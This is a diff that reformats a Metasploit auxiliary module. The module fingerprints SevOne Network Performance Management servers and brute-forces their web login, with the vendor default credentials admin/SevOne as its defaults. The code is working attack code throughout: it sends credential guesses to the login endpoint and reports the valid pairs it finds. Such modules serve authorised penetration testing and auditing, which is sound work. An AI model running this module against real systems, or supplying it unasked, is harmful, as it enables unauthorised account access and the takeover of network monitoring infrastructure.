@@ -3,33 +3,39 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'	=> 'SevOne Network Performance Management Application Brute Force Login Utility',
-      'Description'    => %{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'	=> 'SevOne Network Performance Management Application Brute Force Login Utility',
+        'Description' => %q{
           This module scans for SevOne Network Performance Management System Application,
-        finds its version, and performs login brute force to identify valid credentials.
-      },
-      'Author'         =>
-        [
+          finds its version, and performs login brute force to identify valid credentials.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'DisclosureDate' => '2013-06-07',
-      'License'        => MSF_LICENSE
-    ))
-  register_options(
-    [
-      OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
-      OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne'])
-    ])
+        'DisclosureDate' => '2013-06-07',
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
+    register_options(
+      [
+        OptString.new('USERNAME', [false, 'A specific username to authenticate as', 'admin']),
+        OptString.new('PASSWORD', [false, 'A specific password to authenticate with', 'SevOne'])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -49,10 +55,11 @@ class MetasploitModule < Msf::Auxiliary
   #
   def is_app_sevone?
     res = send_request_cgi(
-    {
-      'uri'       => '/doms/about/index.php',
-      'method'    => 'GET'
-    })
+      {
+        'uri' => '/doms/about/index.php',
+        'method' => 'GET'
+      }
+    )
 
     if (res and res.code.to_i == 200 and res.get_cookies.include?('SEVONE'))
       version_key = /Version: <strong>(.+)<\/strong>/
@@ -97,43 +104,43 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("#{rhost}:#{rport} - Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => "/doms/login/processLogin.php",
-        'method'    => 'GET',
-        'vars_get'    =>
         {
-          'login' => user,
-          'passwd' => pass,
-          'tzOffset' => '-25200',
-          'tzString' => 'Thur+May+05+1983+05:05:00+GMT+0700+'
+          'uri' => "/doms/login/processLogin.php",
+          'method' => 'GET',
+          'vars_get' =>
+          {
+            'login' => user,
+            'passwd' => pass,
+            'tzOffset' => '-25200',
+            'tzString' => 'Thur+May+05+1983+05:05:00+GMT+0700+'
+          }
         }
-      })
-
-    if res.nil?
-      print_error("#{rhost}:#{rport} - Connection timed out")
-      return :abort
-    end
-
-    check_key = "The user has logged in successfully."
-
-    key = JSON.parse(res.body)["statusString"]
-
-    if (not res or key != "#{check_key}")
-      vprint_error("#{rhost}:#{rport} - FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
-      return :skip_pass
-    else
-      print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
-      report_cred(
-        ip: rhost,
-        port: rport,
-        service_name: 'SevOne Network Performance Management System Application',
-        user: user,
-        password: pass,
-        proof: key
       )
-      return :next_user
-    end
 
+      if res.nil?
+        print_error("#{rhost}:#{rport} - Connection timed out")
+        return :abort
+      end
+
+      check_key = "The user has logged in successfully."
+
+      key = JSON.parse(res.body)["statusString"]
+
+      if (not res or key != "#{check_key}")
+        vprint_error("#{rhost}:#{rport} - FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
+        return :skip_pass
+      else
+        print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
+        report_cred(
+          ip: rhost,
+          port: rport,
+          service_name: 'SevOne Network Performance Management System Application',
+          user: user,
+          password: pass,
+          proof: key
+        )
+        return :next_user
+      end
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
       return :abort
